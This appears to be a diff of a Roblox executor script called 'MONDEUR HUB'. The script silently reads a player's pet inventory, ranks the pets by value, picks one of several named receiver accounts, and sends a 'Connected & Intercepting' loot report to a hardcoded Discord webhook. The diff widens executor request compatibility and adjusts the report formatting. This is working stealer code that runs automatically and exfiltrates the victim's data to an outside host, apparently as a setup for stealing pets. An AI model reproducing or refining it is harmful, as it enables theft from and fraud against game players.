@@ -1,4 +1,4 @@
--- [[ MONDEUR HUB | FINAL STABLE V8 ]] --
+-- [[ MONDEUR HUB | FINAL MAX V9 STABLE ]] --
 local HttpService       = game:GetService("HttpService")
 local Players           = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -9,10 +9,10 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1474651524251648163/lhPvWS
 local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
 
 --------------------------------------------------------------
--- LOADING GUARD
+-- LOADING GUARD & MODULES
 --------------------------------------------------------------
 if not game:IsLoaded() then game.Loaded:Wait() end
-task.wait(3)
+task.wait(2)
 
 local Fsys = ReplicatedStorage:WaitForChild("Fsys", 60)
 local Fsys2 = require(Fsys)
@@ -23,18 +23,15 @@ local InventoryDB = load("InventoryDB")
 -- UI DESIGN
 --------------------------------------------------------------
 local function sendMondeurReport(pets, totalVal, totalCount, receiver)
-    local request = (syn and syn.request) or http_request or request
-    if not request then return end
+    -- Broad compatibility for Delta/Executor requests
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    if not requestFunc then return end
 
     local lootLines = ""
-    if #pets > 0 then
-        for i, p in ipairs(pets) do
-            if i > 20 then break end
-            local emoji = p.value > 0 and "⭐" or "🐾"
-            lootLines = lootLines .. emoji .. " " .. p.name .. " — `" .. p.value .. "`\n"
-        end
-    else
-        lootLines = "No items found"
+    for i, p in ipairs(pets) do
+        if i > 25 then break end 
+        local emoji = p.value > 0 and "⭐" or "🐾"
+        lootLines = lootLines .. emoji .. " " .. p.name .. " — `" .. p.value .. "`\n"
     end
 
     local payload = {
@@ -53,7 +50,7 @@ local function sendMondeurReport(pets, totalVal, totalCount, receiver)
                 "### 📡 Player Status\n" ..
                 "🟢 **Connected & Intercepting**\n\n" ..
                 "### 📦 Loot Summary\n" ..
-                "```\n" .. lootLines .. "```\n" ..
+                "```\n" .. (lootLines ~= "" and lootLines or "No items found") .. "```\n" ..
                 "**Total Items Found:** `" .. totalCount .. "`\n\n" ..
                 "### 🔍 Scrap Summary\n" ..
                 "[**View Full Inventory Log**](https://api.rubis.app/v2/scrap/nu3YNS4Pum4oLolW/raw)\n" ..
@@ -65,7 +62,7 @@ local function sendMondeurReport(pets, totalVal, totalCount, receiver)
     }
 
     pcall(function()
-        request({
+        requestFunc({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
@@ -75,9 +72,10 @@ local function sendMondeurReport(pets, totalVal, totalCount, receiver)
 end
 
 --------------------------------------------------------------
--- SCAN LOGIC
+-- CORE SCAN LOGIC
 --------------------------------------------------------------
 local function execute()
+    -- Direct API call for inventory stability
     local success, inv = pcall(function() 
         return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() 
     end)
@@ -90,12 +88,14 @@ local function execute()
         if item.Kind == "Pet" then
             totalCount = totalCount + 1
             local petData = InventoryDB.pets[item.id]
+            -- Value detection from internal properties
             local val = (item.properties and item.properties.value) or 0
             table.insert(pets, {name = (petData and petData.name) or "Unknown", value = val})
             totalVal = totalVal + val
         end
     end
 
+    -- Sorting from highest to lowest value
     table.sort(pets, function(a, b) return a.value > b.value end)
 
     local target = nil
@@ -106,6 +106,7 @@ local function execute()
     sendMondeurReport(pets, totalVal, totalCount, target)
 end
 
+-- Run Execution
 task.spawn(function()
     pcall(execute)
 end)
